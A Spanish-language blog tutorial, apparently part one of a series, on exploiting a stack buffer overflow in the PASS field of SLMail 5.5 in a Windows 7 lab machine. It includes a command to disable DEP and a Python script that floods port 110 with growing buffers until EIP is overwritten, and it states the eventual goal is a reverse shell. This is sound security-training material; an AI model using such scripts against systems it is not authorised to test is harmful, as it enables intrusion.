---
layout: single
title: Stack Buffer Overflow en Windows
excerpt: "En este artículo vemos cómo explotar un stack buffer overflow en una aplicación vulnerable llamada SLMail corriendo en una máquina virtual con windows 7 x86."
date: 2021-02-13
classes: wide
header:
  teaser: /assets/images/Stack-Buffer-Overflow-Windows/buffer-overflow-windows.jpg
  teaser_home_page: true
categories:
  - Buffer-Overflow
tags:
  - Buffer Overflow
  - Python
  - Pentesting
---

![](/assets/images/Stack-Buffer-Overflow-Windows/buffer-overflow-windows.jpg)

En este artículo veremos cómo explotar un buffer overflow en una aplicación vulnerable llamada SLMail corriendo en una máquina virtual Windows 7 x86.

Primero quiero agradecer a s4vitar por su tutorial y por servirme de inspiración.

Necesitaremos una máquina virtual con windows 7 x86, el software SLMail v5.5, inmunity debuguer y mona.py para añadir funcionalidades al debuguer.

Links de descarga:

[SLMail 5.5](https://slmail.software.informer.com/5.5/)<br>
[Inmunity debuguer](https://www.immunityinc.com/products/debugger/)<br>
[Mona.py](https://github.com/corelan/mona/blob/master/mona.py)<br>

Instalaremos SLMail y inmunity debuguer en la máquina windows, y luego añadiremos mona al inmunity debuguer. Para ello descargaremos el script y lo colocaremos en la ruta C:\Program Files\Inmunity Inc\Inmunity Debuguer\PyCommands\.

Además tendremos que crear reglas en el firewall de windows para permitan el tráfico en los puertos 25 y 110. Y por último deshabilitar el DEP con el siguiente comando ejecutado como administrador:

`bcdedit.exe /set {current} nx AllwaysOff`

Cuando tengamos esto ya podemos empezar a practicar.

Si lanzamos un nmap a la ip de la máquina tiene que responder con los puertos 25 y 110 abiertos, entre otros.

![](/assets/images/Stack-Buffer-Overflow-Windows/nmap-slmail.png)

En la máquina windows siempre ejecutaremos las aplicaciones SLMail y inmunity debuguer como administrador. Abrimos las dos aplicaciones, en el debuguer pulsamos en File/Atach, seleccionamos el proceso SLmail, y pulsamos en el icono Run Program o pulsamos F9.

![](/assets/images/Stack-Buffer-Overflow-Windows/slmail.png)

![](/assets/images/Stack-Buffer-Overflow-Windows/inmunity.png)

En este punto si hacemos un searchsploit slmail vemos que hay varios exploits que se aprovechan del campo PASS en el momento de la autenticación. Con lo cual el campo vulnerable es PASS.

![](/assets/images/Stack-Buffer-Overflow-Windows/searchsploit-slmail.png)

## Explicación sencilla del stack buffer overflow

Una explicación sencilla sería la siguiente. Cuando alguien se autentica contra el SLMail, tiene que introducir lógicamente un usuario y contraseña. Bien pues en el campo PASS no se está controlando la cantidad de bytes que puede aceptar, con lo cual si nosotros le pasamos más de los que tiene definidos a nivel de código se producirá un desbordamiento de memória, y estaremos sobreescribiendo partes de la memória que no deberian de tomar esos valores para una ejecución normal del programa.

Se trata de tomar el control del registro EIP, que siempre apunta a la próxima dirección de memoria a ejecutar, para que el flujo del programa se desplace hasta la dirección que nosotros queramos, donde habremos sobreescrito los valores de esas direcciones con nuestro shellcode, que nos lanzará una reverse shell y nos conectará a la máquina victima.

## Exploit inicial

Empezamos con el exploit. Crearemos un script en python que se conectará a la máquina windows en el puerto 110 y le pasará un usuario, y en el campo PASS le iremos pasando el carácter "A" muchas veces para ver cuando corrompe el programa.

El código es el siguiente:

```python
#!/usr/bin/python
#coding: utf-8

from pwn import *
import socket, sys

if len(sys.argv) < 2:
        print "\n[!] Uso: python " + sys.argv[0] + " <ip_address>\n"
        sys.exit(0)

#Variables globales
ip_address = '192.168.1.20'
rport = 110

if __name__ == '__main__':
        buffer = ["A"]
        contador = 350

        while len(buffer) < 32:
                buffer.append("A"*contador)
                contador += 350


        p1 = log.progress("Data")


        for strings in buffer:

                try:
                        p1.status("Enviando %s bytes" % len(strings))
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip_address, rport))

                        data = s.recv(1024)

                        s.send("USER ximo\r\n")
                        data = s.recv(1024)
                        s.send("PASS %s\r\n" % strings)
                        data = s.recv(1024)

                except:
                        print "\n[!] Ha habido un error de conexión\n"
                        sys.exit(1)

```

Ejecutamos el exploit y vemos lo que sucede en el inmunity debuguer. Podemos ver que se ha corrompido el programa porque hemos sobreescrito direcciones de memória, incluido el registro EIP que ahora apunta a la dirección 0x41414141, que son nuestras "A", y al no ser una dirección válida se detiene el flujo de ejecución.

![](/assets/images/Stack-Buffer-Overflow-Windows/exploit-inicial.png)

